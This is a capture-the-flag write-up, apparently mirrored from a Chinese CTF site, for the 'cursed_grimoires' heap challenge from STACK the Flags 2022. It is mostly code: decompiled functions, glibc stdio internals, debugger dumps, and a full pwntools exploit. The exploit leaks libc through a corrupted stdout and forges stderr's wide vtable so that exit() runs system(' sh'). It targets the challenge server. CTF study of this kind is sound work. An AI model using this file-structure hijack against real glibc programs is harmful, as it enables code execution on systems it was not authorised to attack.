# STACK the Flags CTF 2022

> 原文: https://www.ctfiot.com/84747.html
> ID: 84747


```
1
2
3
4
5
6
```



```
╰─❯ checksec cursed_grimoires
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
```



```
1
2
```



```
╰─❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
```



```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
 int v3; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v4; // [rsp+8h] [rbp-8h]

 v4 = __readfsqword(0x28u);
 setup_IO(argc, argv, envp);
 v3 = 0;
 while ( 1 )
 {
 while ( 1 )
 {
 menu();
 printf("\nEnter choice => ");
 __isoc99_scanf("%d", &v3);
 if ( v3 != 1 )
 break;
 create_grimoire();
 }
 if ( v3 != 2 )
 exit(0);
 edit_grimoire();
 }
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
```



```
unsigned __int64 menu()
{
 unsigned __int64 v1; // [rsp+8h] [rbp-8h]

 v1 = __readfsqword(0x28u);
 printf("\x1B[2J\x1B[H");
 puts(s);
 puts("1. Create Grimoire (Only once)");
 puts("2. Edit Grimoire");
 puts("3. Finish Grimoire");
 return v1 - __readfsqword(0x28u);
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
```



```
unsigned __int64 create_grimoire()
{
 size_t size; // [rsp+0h] [rbp-10h] BYREF
 unsigned __int64 v2; // [rsp+8h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 printf("\x1B[2J\x1B[H");
 if ( !GRIMOIRE )
 {
 printf("Size of grimoire => ");
 size = 0LL;
 __isoc99_scanf("%zu", &size);
 while ( getchar() != 10 )
 ;
 GRIMOIRE = (char *)malloc(size);
 printf("Write your contents => ");
 fgets(GRIMOIRE, size - 1, stdin);
 }
 return v2 - __readfsqword(0x28u);
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
```



```
unsigned __int64 edit_grimoire()
{
 char v1; // [rsp+3h] [rbp-Dh]
 int v2; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("\x1B[2J\x1B[H");
 if ( GRIMOIRE )
 {
 printf("Index to edit => ");
 __isoc99_scanf("%d", &v2);
 while ( getchar() != 10 )
 ;
 printf("Replacement => ");
 v1 = getchar();
 while ( getchar() != 10 )
 ;
 GRIMOIRE[v2] = v1;
 }
 return v3 - __readfsqword(0x28u);
}
```



```
1
2
3
4
5
6
7
```



```
NOTES
 By default, Linux follows an optimistic memory allocation strategy. This means that when malloc() returns non-NULL there is no guarantee that the memory really is available. In case it
 turns out that the system is out of memory, one or more processes will be killed by the OOM killer. For more information, see the description of /proc/sys/vm/overcommit_memory and
 /proc/sys/vm/oom_adj in proc(5), and the Linux kernel source file Documentation/vm/overcommit-accounting.rst.

 Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the
 glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2).
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
```



```
gef➤ x/gx &GRIMOIRE
0x55e0067dd030 <GRIMOIRE>: 0x00007f3b78939010
gef➤ vmmap
[ Legend: Code | Heap | Stack ]
Start End Offset Perm Path
0x000055e0067d9000 0x000055e0067da000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055e0067da000 0x000055e0067db000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055e0067db000 0x000055e0067dc000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055e0067dc000 0x000055e0067dd000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055e0067dd000 0x000055e0067de000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055e0067de000 0x000055e0067df000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055e007bc6000 0x000055e007be7000 0x0000000000000000 rw- [heap]
0x00007f3b78939000 0x00007f3b78a31000 0x0000000000000000 rw-
0x00007f3b78a31000 0x00007f3b78a59000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
```



```
gef➤ x/gx &GRIMOIRE
0x555555558030 <GRIMOIRE>: 0x00007ffff7c9c010
gef➤ vmmap
[ Legend: Code | Heap | Stack ]
Start End Offset Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x0000555555559000 0x000055555555a000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
0x000055555555a000 0x000055555557b000 0x0000000000000000 rw- [heap]
0x00007ffff7c9c000 0x00007ffff7d94000 0x0000000000000000 rw-
0x00007ffff7d94000 0x00007ffff7dbc000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
```



```
int
_IO_puts (const char *str)
{
 int result = EOF;
 size_t len = strlen (str);
 _IO_acquire_lock (stdout);

 if ((_IO_vtable_offset (stdout) != 0
 || _IO_fwide (stdout, -1) == -1)
 && _IO_sputn (stdout, str, len) == len
 && _IO_putc_unlocked ('\n', stdout) != EOF)
 result = MIN (INT_MAX, len + 1);

 _IO_release_lock (stdout);
 return result;
}

weak_alias (_IO_puts, puts)
libc_hidden_def (_IO_puts)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
```



```
gef➤ print _IO_2_1_stdout_
$4 = {
 file = {
 _flags = 0xfbad2887,
 _IO_read_ptr = 0x7ffff7fae803 <_IO_2_1_stdout_+131> "\n",
 _IO_read_end = 0x7ffff7fae803 <_IO_2_1_stdout_+131> "\n",
 _IO_read_base = 0x7ffff7fae803 <_IO_2_1_stdout_+131> "\n",
 _IO_write_base = 0x7ffff7fae803 <_IO_2_1_stdout_+131> "\n",
 _IO_write_ptr = 0x7ffff7fae803 <_IO_2_1_stdout_+131> "\n",
 _IO_write_end = 0x7ffff7fae803 <_IO_2_1_stdout_+131> "\n",
...
 _wide_data = 0x7ffff7fad9a0 <_IO_wide_data_1>,
 },
 vtable = 0x7ffff7faa600 <__GI__IO_file_jumps>
}
gef➤ print __GI__IO_file_jumps
$5 = {
...
 __overflow = 0x7ffff7e20e40 <_IO_new_file_overflow>,
 __underflow = 0x7ffff7e20b30 <_IO_new_file_underflow>,
 __uflow = 0x7ffff7e21de0 <__GI__IO_default_uflow>,
 __pbackfail = 0x7ffff7e23300 <__GI__IO_default_pbackfail>,
 __xsputn = 0x7ffff7e1f680 <_IO_new_file_xsputn>,
...
 __write = 0x7ffff7e1ef40 <_IO_new_file_write>,
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
```



```
size_t
_IO_new_file_xsputn (FILE *f, const void *data, size_t n)
{
 const char *s = (const char *) data;
 size_t to_do = n;
 int must_flush = 0;
 size_t count = 0;

...

 if (to_do + must_flush > 0)
 {
 size_t block_size, do_write;
 /* Next flush the (full) buffer. */
 if (_IO_OVERFLOW (f, EOF) == EOF)
	/* If nothing else has to be written we must not signal the
 caller that everything has been written. */
	return to_do == 0 ? EOF : n - to_do;

 /* Try to maintain alignment: write a whole number of blocks. */
 block_size = f->_IO_buf_end - f->_IO_buf_base;
 do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);

 if (do_write)
	{
 count = new_do_write (f, s, do_write);
 to_do -= count;
 if (count < do_write)
 return n - to_do;
	}

...

}
libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
```



```
int
_IO_new_file_overflow (FILE *f, int ch)
{
 if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
 {
 f->_flags |= _IO_ERR_SEEN;
 __set_errno (EBADF);
 return EOF;
 }
 /* If currently reading or no buffer allocated. */
 if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
 {
 ...
 }
 if (ch == EOF)
 return _IO_do_write (f, f->_IO_write_base,
 f->_IO_write_ptr - f->_IO_write_base);
 ...
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
```



```
1
2
3
```



```
if (ch == EOF)
 return _IO_do_write (f, f->_IO_write_base,
 f->_IO_write_ptr - f->_IO_write_base);
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
```



```
int
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
 return (to_do == 0
 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
 size_t count;
 if (fp->_flags & _IO_IS_APPENDING)
 /* On a system without a proper O_APPEND implementation,
 you would need to sys_seek(0, SEEK_END) here, but is
 not needed nor desirable for Unix- or Posix-like systems.
 Instead, just indicate that offset (before and after) is
 unpredictable. */
 fp->_offset = _IO_pos_BAD;
 else if (fp->_IO_read_end != fp->_IO_write_base)
 {
 off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
 if (new_pos == _IO_pos_BAD)
	return 0;
 fp->_offset = new_pos;
 }
 count = _IO_SYSWRITE (fp, data, to_do);

...

}

...
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
...

ssize_t
_IO_new_file_write (FILE *f, const void *data, ssize_t n)
{
 ssize_t to_do = n;
 while (to_do > 0)
 {
 ssize_t count = (__builtin_expect (f->_flags2
 & _IO_FLAGS2_NOTCANCEL, 0)
 ? __write_nocancel (f->_fileno, data, to_do)
 : __write (f->_fileno, data, to_do));
 if (count < 0)
	{
 f->_flags |= _IO_ERR_SEEN;
 break;
	}
 to_do -= count;
 data = (void *) ((char *) data + count);
 }
 n -= to_do;
 if (f->_offset >= 0)
 f->_offset += n;
 return n;
}
```



```
1
2
3
4
5
6
```



```
puts(str)
|_ _IO_new_file_xsputn (stdout, str, len)
 |_ _IO_new_file_overflow (stdout, EOF)
 |_ new_do_write(stdout, stdout->_IO_write_base, stdout->_IO_write_ptr - stdout->_IO_write_base)
 |_ _IO_new_file_write(stdout, stdout->_IO_write_base, stdout->_IO_write_ptr - stdout->_IO_write_base)
 |_ write(stdout->fileno, stdout->_IO_write_base, stdout->_IO_write_ptr - stdout->_IO_write_base)
```



```
1
2
3
4
5
6
7
8
```



```
gef➤ tele 0x7ffff7fae803
0x00007ffff7fae803│+0x0000: 0xfafa70000000000a ("\n"?)
0x00007ffff7fae80b│+0x0008: 0xffffff00007ffff7
...
gef➤ tele 0x7ffff7fae803+5
0x00007ffff7fae808│+0x0000: 0x00007ffff7fafa70 → 0x0000000000000000
0x00007ffff7fae810│+0x0008: 0xffffffffffffffff
...
```



```
1
2
3
```



```
_flags & _IO_NO_WRITES == 0
_flags & _IO_CURRENTLY_PUTTING == 1
_flags & _IO_IS_APPENDING == 1
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
```



```
def create(r, size, content):
 r.sendlineafter(b'=> ', b'1')
 r.sendlineafter(b'=> ', str(size).encode())
 r.sendlineafter(b'=> ', content)

def edit(r, offset, val):
 r.sendlineafter(b'=> ', b'2')
 r.sendlineafter(b'=> ', str(offset).encode())
 r.sendlineafter(b'=> ', bytes([val]))

def exit_binary(r):
 r.sendlineafter(b'=> ', b'3')
 r.interactive()
```



```
1
2
3
4
5
```



```
# Create a big chunk, so that our chunk is located on the newly page
# created by mmap (To be precise, at libc_base-0xf7ff0)
chunk_size = 1000000
offset_to_libc = 0xf7ff0
create(r, chunk_size, b'a'*8)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
```



```
'''
Leak libc base via stdout
'''
# Prepare the correct offset for stdout and stderr
stdout_offset_from_chunk = offset_to_libc + libc.symbols['_IO_2_1_stdout_']
stderr_offset_from_chunk = offset_to_libc + libc.symbols['_IO_2_1_stderr_']
log.info(f'Stdout offset: {hex(stdout_offset_from_chunk)}')
log.info(f'Stderr offset: {hex(stderr_offset_from_chunk)}')

# Overwrite stdout->_flags to 0x1800
flags_offset = 0x0 # stdout->_flags = &stdout + 0x0
flags = p32(0x1800)
for i in range(len(flags)):
 edit(r, stdout_offset_from_chunk+flags_offset+i, flags[i])
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
```



```
# Overwrite stdout->_IO_write_ptr to be larger than
write_ptr_offset = 0x28 # stdout->_IO_write_ptr = &stdout + 0x28
write_ptr_lsb = 0x50 # You can choose any value. I choose 0x50
edit(r, stdout_offset_from_chunk+write_ptr_offset, write_ptr_lsb)

# Now, when the binary called menu() (which will call puts())
# It will leak a libc address, which equivalents to _IO_stdfile_1_lock
out = r.recv(16)[5:]
leaked_libc = u64(out[:8])
log.info(f'Leaked libc : {hex(leaked_libc)}')
libc_base = leaked_libc-libc.symbols['_IO_stdfile_1_lock']
log.info(f'Libc base : {hex(libc_base)}')
libc.address = libc_base
chunk_addr = libc_base - 0xf7ff0
log.info(f'Chunk addr : {hex(chunk_addr)}')
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
```



```
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
 /* Fast path: The vtable pointer is within the __libc_IO_vtables
 section. */
 uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
 uintptr_t ptr = (uintptr_t) vtable;
 uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
 if (__glibc_unlikely (offset >= section_length))
 /* The vtable pointer is not in the expected section. Use the
 slow path, which will terminate the process if necessary. */
 _IO_vtable_check ();
 return vtable;
}

#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)

#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))

#define _IO_JUMPS_FILE_plus(THIS) \
 _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
```



```
gef➤ print __GI__IO_wfile_jumps
$11 = {
 __dummy = 0x0,
 __dummy2 = 0x0,
 __finish = 0x7ffff7e20070 <_IO_new_file_finish>,
 __overflow = 0x7ffff7e1a410 <__GI__IO_wfile_overflow>,
 __underflow = 0x7ffff7e19050 <__GI__IO_wfile_underflow>,
 __uflow = 0x7ffff7e178c0 <__GI__IO_wdefault_uflow>,
 __pbackfail = 0x7ffff7e17680 <__GI__IO_wdefault_pbackfail>,
 __xsputn = 0x7ffff7e1a8c0 <__GI__IO_wfile_xsputn>,
 __xsgetn = 0x7ffff7e1f330 <__GI__IO_file_xsgetn>,
 __seekoff = 0x7ffff7e197d0 <__GI__IO_wfile_seekoff>,
 __seekpos = 0x7ffff7e22530 <_IO_default_seekpos>,
 __setbuf = 0x7ffff7e1e620 <_IO_new_file_setbuf>,
 __sync = 0x7ffff7e1a720 <__GI__IO_wfile_sync>,
 __doallocate = 0x7ffff7e13f10 <_IO_wfile_doallocate>,
 __read = 0x7ffff7e1f9b0 <__GI__IO_file_read>,
 __write = 0x7ffff7e1ef40 <_IO_new_file_write>,
 __seek = 0x7ffff7e1e6f0 <__GI__IO_file_seek>,
 __close = 0x7ffff7e1e610 <__GI__IO_file_close>,
 __stat = 0x7ffff7e1ef30 <__GI__IO_file_stat>,
 __showmanyc = 0x7ffff7e234a0 <_IO_default_showmanyc>,
 __imbue = 0x7ffff7e234b0 <_IO_default_imbue>
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
```



```
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
 if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
 {
 f->_flags |= _IO_ERR_SEEN;
 __set_errno (EBADF);
 return WEOF;
 }
 /* If currently reading or no buffer allocated. */
 if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
 {
 /* Allocate a buffer if needed. */
 if (f->_wide_data->_IO_write_base == 0)
	{
 _IO_wdoallocbuf (f);
 ...
	}
 ...
}

void
_IO_wdoallocbuf (FILE *fp)
{
 if (fp->_wide_data->_IO_buf_base)
 return;
 if (!(fp->_flags & _IO_UNBUFFERED))
 if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
 ...
}

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)

#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)

#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)

#define _IO_WIDE_JUMPS(THIS) \
 _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
```



```
gef➤ print _IO_wide_data_1
$10 = {
 _IO_read_ptr = 0x0,
 _IO_read_end = 0x0,
 _IO_read_base = 0x0,
 _IO_write_base = 0x0,
 _IO_write_ptr = 0x0,
 _IO_write_end = 0x0,

...

 _shortbuf = L"",
 _wide_vtable = 0x7ffff7faa0c0 <__GI__IO_wfile_jumps> <- This is the one that we can overwrite with our fake vtable
}
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
```



```
Assuming that we overwrite the FILE->vtable from _IO_file_jumps to _IO_wfile_jumps. When the binary try to call
_IO_OVERFLOW (fp, EOF), the chain would be:

_IO_OVERFLOW (fp, EOF)
|_ JUMP1 (__overflow, fp, EOF)
 |_ (_IO_JUMPS_FUNC(fp)->__overflow) (fp, EOF)
 |_ ((IO_validate_vtable (_IO_JUMPS_FILE_plus (fp)))->__overflow) (fp, EOF) <- Because we overwrite it to point to _IO_wfile_jumps, it will call _IO_wfile_overflow instead of _IO_new_file_overflow. This is still valid because its location is still in the correct region
 |_ _IO_wfile_overflow(fp, EOF)
 |_ _IO_wdoallocbuf(fp)
 |_ _IO_WDOALLOCATE(fp)
 |_ WJUMP0 (__doallocate, fp)
 |_ (_IO_WIDE_JUMPS_FUNC(fp)->__doallocate) (fp)
 |_ (_IO_WIDE_JUMPS(fp)->__doallocate) (fp) <- No Validation #profit :D
```



```
1
2
3
4
5
```



```
exit
|_ _IO_cleanup
 |_ _IO_flush_all_lockp
 Iterate list of available files (stderr->stdout->stdin), and on each iteration it will call:
 |_ _IO_OVERFLOW (fp, EOF)
```



```
1
2
3
4
5
6
```



```
# Setup fake _wide_vtable
fake_wide_vtable_addr = chunk_addr + 0x100
fake_wide_vtable_doallocate_offset_from_chunk = (fake_wide_vtable_addr - chunk_addr) + 0x68
system_addr = libc.symbols['system']
for i, num in enumerate(p64(system_addr)):
 edit(r, fake_wide_vtable_doallocate_offset_from_chunk+i, num)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
```



```
# Setup fake _wide_data
fake_wide_data_addr = chunk_addr
fake_wide_data_IO_write_base_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0x20
fake_wide_data_IO_buf_base_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0x38
fake_wide_data_wide_vtable_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0xe0
for i, num in enumerate(p64(0)): # Set _wide_data->_IO_write_base_offset to 0
 edit(r, fake_wide_data_IO_write_base_offset_from_chunk+i, num)
for i, num in enumerate(p64(0)): # Set _wide_data->_IO_buf_base_offset to 0
 edit(r, fake_wide_data_IO_buf_base_offset_from_chunk+i, num)
for i, num in enumerate(p64(fake_wide_vtable_addr)): # Set _wide_data->_wide_vtable to fake_wide_vtable_addr
 edit(r, fake_wide_data_wide_vtable_offset_from_chunk+i, num)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
```



```
# Forge stderr
fake_stderr = FileStructure(0)
fake_stderr.flags = u64(b' sh\x00\x00\x00\x00')
fake_stderr._IO_write_base = 0
fake_stderr._IO_write_ptr = 1 # _IO_write_ptr > _IO_write_base
fake_stderr._wide_data = fake_wide_data_addr
fake_stderr.vtable = libc.symbols['_IO_wfile_jumps']
fake_stderr_bytes = bytes(fake_stderr)
for i, num in enumerate(fake_stderr_bytes):
 edit(r, stderr_offset_from_chunk+i, num)
```



```
1
2
```



```
# Exit and profit :D
exit_binary(r)
```



```
1
 2
 3
 4
 5
 6
 7
 8
 9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
```



```
from pwn import *

exe = ELF("cursed_grimoires_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "157.230.242.192"
remote_port = 30472
gdbscript = '''
'''

def conn():
 if args.LOCAL:
 r = process([exe.path], env={})
 if args.PLT_DEBUG:
 gdb.attach(r, gdbscript=gdbscript)
 pause()
 else:
 r = remote(remote_url, remote_port)

 return r

r = conn()

def create(r, size, content):
 r.sendlineafter(b'=> ', b'1')
 r.sendlineafter(b'=> ', str(size).encode())
 r.sendlineafter(b'=> ', content)

def edit(r, offset, val):
 r.sendlineafter(b'=> ', b'2')
 r.sendlineafter(b'=> ', str(offset).encode())
 r.sendlineafter(b'=> ', bytes([val]))

def exit_binary(r):
 r.sendlineafter(b'=> ', b'3')
 r.interactive()

# Create a big chunk, so that our chunk is located on the newly page
# created by mmap (To be precise, at libc_base-0xf7ff0)
chunk_size = 1000000
offset_to_libc = 0xf7ff0
create(r, chunk_size, b'a'*8)

'''
Leak libc base via stdout
'''
# Prepare the correct offset for stdout and stderr
stdout_offset_from_chunk = offset_to_libc + libc.symbols['_IO_2_1_stdout_']
stderr_offset_from_chunk = offset_to_libc + libc.symbols['_IO_2_1_stderr_']
log.info(f'Stdout offset: {hex(stdout_offset_from_chunk)}')
log.info(f'Stderr offset: {hex(stderr_offset_from_chunk)}')

# Overwrite stdout->_flags to 0x1800
flags_offset = 0x0 # stdout->_flags = &stdout + 0x0
flags = p32(0x1800)
for i in range(len(flags)):
 edit(r, stdout_offset_from_chunk+flags_offset+i, flags[i])

# Overwrite stdout->_IO_write_ptr to be larger than
write_ptr_offset = 0x28 # stdout->_IO_write_ptr = &stdout + 0x28
write_ptr_lsb = 0x50 # You can choose any value. I choose 0x50
edit(r, stdout_offset_from_chunk+write_ptr_offset, write_ptr_lsb)

# Now, when the binary called menu() (which will call puts())
# It will leak a libc address, which equivalents to _IO_stdfile_1_lock
out = r.recv(16)[5:]
leaked_libc = u64(out[:8])
log.info(f'Leaked libc : {hex(leaked_libc)}')
libc_base = leaked_libc-libc.symbols['_IO_stdfile_1_lock']
log.info(f'Libc base : {hex(libc_base)}')
libc.address = libc_base
chunk_addr = libc_base - 0xf7ff0
log.info(f'Chunk addr : {hex(chunk_addr)}')

'''
Getting RIP Control via exit through stderr
'''
# Setup fake _wide_vtable
fake_wide_vtable_addr = chunk_addr + 0x100
fake_wide_vtable_doallocate_offset_from_chunk = (fake_wide_vtable_addr - chunk_addr) + 0x68
system_addr = libc.symbols['system']
for i, num in enumerate(p64(system_addr)):
 edit(r, fake_wide_vtable_doallocate_offset_from_chunk+i, num)

# Setup fake _wide_data
fake_wide_data_addr = chunk_addr
fake_wide_data_IO_write_base_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0x20
fake_wide_data_IO_buf_base_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0x38
fake_wide_data_wide_vtable_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0xe0
for i, num in enumerate(p64(0)): # Set _wide_data->_IO_write_base_offset to 0
 edit(r, fake_wide_data_IO_write_base_offset_from_chunk+i, num)
for i, num in enumerate(p64(0)): # Set _wide_data->_IO_buf_base_offset to 0
 edit(r, fake_wide_data_IO_buf_base_offset_from_chunk+i, num)
for i, num in enumerate(p64(fake_wide_vtable_addr)): # Set _wide_data->_wide_vtable to fake_wide_vtable_addr
 edit(r, fake_wide_data_wide_vtable_offset_from_chunk+i, num)

# Forge stderr
fake_stderr = FileStructure(0)
fake_stderr.flags = u64(b' sh\x00\x00\x00\x00')
fake_stderr._IO_write_base = 0
fake_stderr._IO_write_ptr = 1 # _IO_write_ptr > _IO_write_base
fake_stderr._wide_data = fake_wide_data_addr
fake_stderr.vtable = libc.symbols['_IO_wfile_jumps']
fake_stderr_bytes = bytes(fake_stderr)
for i, num in enumerate(fake_stderr_bytes):
 edit(r, stderr_offset_from_chunk+i, num)

# Exit and profit :D
exit_binary(r)
```
